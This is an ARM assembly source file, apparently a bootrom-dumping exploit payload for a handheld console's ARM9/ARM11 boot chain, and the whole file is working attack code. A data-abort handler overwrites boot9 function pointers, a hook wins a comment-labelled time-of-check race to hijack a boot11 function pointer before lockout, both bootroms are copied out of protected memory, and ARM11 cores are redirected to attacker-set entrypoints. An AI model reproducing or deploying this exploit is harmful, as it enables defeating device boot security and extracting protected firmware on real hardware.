.arm.little

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Useful constant addresses.

b9_memcpy equ 0xFFFF03F0
b9_store_addr equ 0x08010000
b11_store_addr equ 0x08020000
b11_axi_addr equ 0x1FFC0000

code_11_load_addr equ 0x1FF80000

.create "code9.bin",0x08000200

.area 1F0h

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Boot9 Data Abort handler: Overwrites two boot9 function pointers, then returns.
dabort_handler:
    ldr r3, =0x080003F8 ; r3 = flag_loc
    ldr r2, [r3]        ; r2 = *(flag_loc)
    cmp r2, #0x0        ; did we do this yet?
    bne handler_done    ; if so, were done here.

    str r2, [r3]        ; write to "did we do this yet?" flag.
    ldr r3, =0xFFF00058 ; dtcm funcptr_1
    ldr r2, =b9_hook_1  ; r2 = b9_hook_1
    str r2, [r3]        ; Overwrite first function pointer
    ldr r2, =b9_hook_2  ; r2 = b9_hook_2
    str r2, [r3, #0x4]  ; Overwrite second function pointer
handler_done:
    mov r2, #0x0
    mov r3, #0x0
    subs pc, lr, #0x4   ; Skip the offending dabrt instruction

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; b9_hook_1: Wait for boot11 to finish a task, then overwrite a function pointer
;            it will call just before lockout. Then, setup the MPU, and return.
b9_hook_1:
    pwn_b11:
        stmfd sp!, {r0-r6, lr}
        ldr r0, =0x1FFE802C        ; r0 = b11_funcptr_address
        ldr r1, =code_11_load_addr ; r1 = our_boot11_hook
        str r1, [r0]               ; overwrite value
        wait_loop:                 ; This is actually a ToCToU race condition.
            ldr r2, [r0]           ; Derefence      
            cmp r2, r1             ; Has stored value changed?
            beq wait_loop          ; If not, go back.
        str r1, [r0]               ; Overwrite final funcptr.

    ; setup_mpu: 
    setup_mpu:
        ldr r0, =0x33333333
        mcr p15,0,r0,c5,c0,3
        mcr p15,0,r0,c5,c0,2

    mov r0, #0x0            
    ldr r1, =b11_axi_addr   
    str r0, [r1, #-0x4]            ; Ensure that b11 knows when we are ready.
    ldmfd sp!, {r0-r6, pc}

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; b9_hook_2: Dump the arm11 bootrom, synchronize with boot11, dump the arm9
;            bootrom, and then return to execution.
b9_hook_2:
    stmfd sp!, {r0-r6, lr}

    ; Dump boot11
    ldr r0, =b11_axi_addr
    wait_for_b11_exec:         ; Wait for boot11 hook to set a flag in axiwram
        ldr r1, [r0, #-0x4]
        cmp r1, #0x0
        beq wait_for_b11_exec

    ldr r1, =b11_store_addr    ; memcpy the arm11 bootrom into safe arm9mem
    mov r2, #0x10000
    ldr r3, =b9_memcpy
    blx r3

    ; Let Boot11 know weve copied it.
    ldr r0, =b11_axi_addr
    mov r1, #0x0
    str r1, [r0, #-0x4]

    ; Dump boot9
    ldr r0, =0xFFFF0000
    ldr r1, =b9_store_addr
    mov r2, #0x10000
    ldr r3, =b9_memcpy
    blx r3
    ldmfd sp!, {r0-r6, pc}

.pool

.endarea

.org 0x080003F0 
.area 10h
ldr pc, [pc, #-0x4]
.dw dabort_handler
.dw 0 ; has dabort handler run flag
b 0x0808FB90
.endarea


.Close
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

.create "code11.bin",code_11_load_addr
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; boot11_hook: This code is called by boot11 just before lockout.
;              It copies the bootrom to axi_wram, then syncs with
;              boot9 hook.
boot11_hook:
stmfd sp!, {r0-r6, lr}
ldr r1, =b11_axi_addr      
ldr r0, =0x10000            
mov r2, #0x0
b11_copy_loop:           ; Simple memcpy loop from boot11 to axiwram.
    ldr r3, [r0, r2]
    str r3, [r1, r2]
    add r2, r2, #0x4
    cmp r2, r0
    blt b11_copy_loop

ldr r1, =b11_axi_addr    ; Let boot9 know that we are done.
mov r0, #0x1
str r0, [r1, #-0x4]

wait_for_b9_copy:        ; Wait for boot9 to confirm it received our dump.
    ldr r0, [r1, #-0x4]
    cmp r0, #0x0
    bne wait_for_b9_copy

ldmfd sp!, {r0-r6, pc}   ; Return to bootrom lockout

.pool

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; arm11_stub: Code that runs post-bootrom lockout on the arm11 cores.
;             Loads an entrypoint that arm9 payload will write.
.org (code_11_load_addr+0x200)

ldr r7, =0x1fffff00
mcr p15, 0, r0, c0, c0, 5   ; read CPU ID
cmp r0, #0
bne _core1_stub

ldr r0, =core1_waiting      ; core0 should wait for core1 to be waiting for an interrupt
_wait_for_core1_loop:
    ldrb r1, [r0]
    cmp r1, #0
    beq _wait_for_core1_loop

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

_core0_stub:

mov r1, #0
str r1, [r7, #0xfc]     ; zero out core0's entrypoint

_wait_for_core0_entrypoint_loop:
    ldr r1, [r7, #0xfc] ; check if core0's entrypoint is 0
    cmp r1, #0
    beq _wait_for_core0_entrypoint_loop

bx r1               ; jump to core0 entrypoint

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

_core1_stub:

ldr r3, =0x17e00000
add r4, r3, #0x1000
ldr r5, =core1_waiting

mov r0, #1
str r0, [r3, #0x100]        ; enable interrupts on core 1
str r0, [r4]                ; enable the distributed interrupt controller

mvn r1, #0
str r1, [r4, #0x280]        ; clear all pending private interrupts

str r0, [r5]

_wfi_core1_loop:
    .dw 0xE320F003          ; Wait for Interrupt
    ldr r3, [r4, #0x280]    ; Read the pending interrupts
    tst r0, #(1 << 1)       ; Wait for SGI n (n = 1). This is raised in void _arm11_entry_main(u32 cpuNum)
    beq _wfi_core1_loop

ldr lr, [r7, #0xdc]
bx lr                       ; jump to core1 entrypoint

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

.pool
core1_waiting: .word 0
.align 0x200

.Close